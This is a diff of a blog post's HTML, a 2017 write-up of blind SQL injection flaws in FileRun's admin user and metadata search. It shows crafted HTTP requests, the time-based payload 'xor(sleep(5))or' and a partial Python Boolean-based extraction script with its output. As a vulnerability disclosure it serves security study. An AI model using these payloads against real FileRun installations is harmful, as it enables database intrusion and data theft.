@@ -47,8 +47,9 @@
 		<main>
 			<div class="post-content">
 <div id="post">
-  <h1 align="center">FileRun &lt;= 2017.09.25 Blind SQLi</h1>
-<p align="right" class="date">18 Dec 2017 - scanf</p>
+<h1 align="center">FileRun <= 2017.09.25 Blind SQLi</h1>
+<!-- <link rel="stylesheet" type="text/css" href="/statics/css/syntax.css"> -->
+  <p align="right" class="date">18 Dec 2017 - scanf</p>
 
 <h2 id="0x00-preface">0x00 Preface</h2>
 
@@ -67,21 +68,20 @@
 
 <p>go to control panel——&gt;Admin——&gt;user——&gt;search,will generate a POST request to the server.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?module=users&amp;section=cpanel&amp;page=list HTTP/1.1
-Host: target.com
-Content-Length: 20
-Origin: http://target.com
-X-Requested-With: XMLHttpRequest
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Accept: */*
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">POST</span> <span class="o">/</span><span class="p">?</span><span class="nx">module</span><span class="o">=</span><span class="nx">users</span><span class="o">&amp;</span><span class="nx">section</span><span class="o">=</span><span class="nx">cpanel</span><span class="o">&amp;</span><span class="nx">page</span><span class="o">=</span><span class="nx">list</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="p">:</span> <span class="nx">target</span><span class="p">.</span><span class="nx">com</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">20</span>
+<span class="nx">Origin</span><span class="p">:</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//target.com</span>
+<span class="nx">X</span><span class="o">-</span><span class="nx">Requested</span><span class="o">-</span><span class="nx">With</span><span class="p">:</span> <span class="nx">XMLHttpRequest</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Macintosh</span><span class="p">;</span> <span class="nx">Intel</span> <span class="nx">Mac</span> <span class="nx">OS</span> <span class="nx">X</span> <span class="mi">10</span><span class="nx">_13_2</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">63.0</span><span class="p">.</span><span class="mf">3239.84</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span><span class="p">;</span> <span class="nx">charset</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>
+<span class="nx">Accept</span><span class="p">:</span> <span class="o">*</span><span class="cm">/*
 Referer: http://target.com/?module=cpanel&amp;_popup_id=popups_1
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: __cfduid=d7455062d8788785c8b64d8dfef5a7f041513411013; language=chinese; FileRunSID=e578cd49697ef564ed0979bde9d67dcf
 Connection: close
 
-limit=50&amp;search=aaaa
-</code></pre></div></div>
+limit=50&amp;search=aaaa</span></code></pre></figure>
 
 <p>我注意到search参数容易受到SQL注入的影响,通过传入aaaa’ 服务器返回了一个500的响应状态:</p>
 
@@ -93,8 +93,7 @@ limit=50&amp;search=aaaa
 
 <p><img src="https://i.loli.net/2018/11/30/5c01504c70061.png" /></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'xor(sleep(5))or'
-</code></pre></div></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="s1">'xor(sleep(5))or'</span></code></pre></figure>
 
 <p>结果如下</p>
 
@@ -104,13 +103,11 @@ limit=50&amp;search=aaaa
 
 <p>Here I create a simple script to extract current select user()query result using Boolean-based technique.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
 <span class="c"># -*- coding:utf-8 -*-</span>
 <span class="c">#__author__ = 'scanf'</span>
 <span class="kn">import</span> <span class="nn">httplib</span>
 <span class="kn">import</span> <span class="nn">time</span>
-
-<span class="c">#add cookies</span>
 
 <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">,</span>
            <span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Googlebot/2.1 (+http://www.googlebot.com/bot.html)'</span><span class="p">,</span>
@@ -135,21 +132,19 @@ limit=50&amp;search=aaaa
                 <span class="n">user</span> <span class="o">+=</span> <span class="n">payload</span>
                 <span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">[in progress]'</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span>
                 <span class="k">break</span>
-<span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">[Done] MySQL user is </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">user</span>
-</code></pre></div></div>
+<span class="k">print</span> <span class="s">'</span><span class="se">\n</span><span class="s">[Done] MySQL user is </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">user</span></code></pre></figure>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[20:39:20] Start to retrive MySQL User:
-. . . . . . 
-[in progress] f . . . . . . . . . 
-[in progress] fi . . . . . . . . . . . . 
-[in progress] fil . . . . . 
-[in progress] file . . . . . . . . . . . . . . . . . . 
-[in progress] filer . . . . . . . . . . . . . . . . . . . . . 
-[in progress] fileru . . . . . . . . . . . . . . 
-[in progress] filerun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
-[in progress] filerun@ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
-[in progress] filerun@1 . . .
-</code></pre></div></div>
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span> <span class="nx">Start</span> <span class="nx">to</span> <span class="nx">retrive</span> <span class="nx">MySQL</span> <span class="nx">User</span><span class="p">:</span>
+<span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">f</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">fi</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">fil</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">file</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">filer</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">fileru</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">filerun</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">filerun</span><span class="p">@</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> 
+<span class="p">[</span><span class="k">in</span> <span class="nx">progress</span><span class="p">]</span> <span class="nx">filerun</span><span class="p">@</span><span class="nd">1</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span></code></pre></figure>
 
 <h3 id="sql2">SQL2</h3>
 
@@ -157,10 +152,10 @@ limit=50&amp;search=aaaa
 
 <p>control panel——&gt;Metadata——&gt;search Same as SQL1,will generate a POST request to the server:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?module=metadata&amp;section=cpanel&amp;page=list_filetypes HTTP/1.1
-Host: target.com
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0
-Accept: */*
+<figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">POST</span> <span class="o">/</span><span class="p">?</span><span class="nx">module</span><span class="o">=</span><span class="nx">metadata</span><span class="o">&amp;</span><span class="nx">section</span><span class="o">=</span><span class="nx">cpanel</span><span class="o">&amp;</span><span class="nx">page</span><span class="o">=</span><span class="nx">list_filetypes</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="p">:</span> <span class="nx">target</span><span class="p">.</span><span class="nx">com</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Macintosh</span><span class="p">;</span> <span class="nx">Intel</span> <span class="nx">Mac</span> <span class="nx">OS</span> <span class="nx">X</span> <span class="mf">10.13</span><span class="p">;</span> <span class="nl">rv</span><span class="p">:</span><span class="mf">57.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">57.0</span>
+<span class="nx">Accept</span><span class="p">:</span> <span class="o">*</span><span class="cm">/*
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Referer: http://target.com/?module=cpanel&amp;_popup_id=popups_1
 X-Requested-With: XMLHttpRequest
@@ -169,8 +164,7 @@ Content-Length: 36
 Cookie: __cfduid=df5ddd49a2303cb2e13b6aa8ece2af7b11513411363; FileRunSID=fa163cd088b68ae20c689826e3a70479; language=chinese
 Connection: close
 
-limit=50&amp;search=aaa'xor(sleep(2))or'
-</code></pre></div></div>
+limit=50&amp;search=aaa'xor(sleep(2))or'</span></code></pre></figure>
 
 <p>然后超时后响应:</p>
 
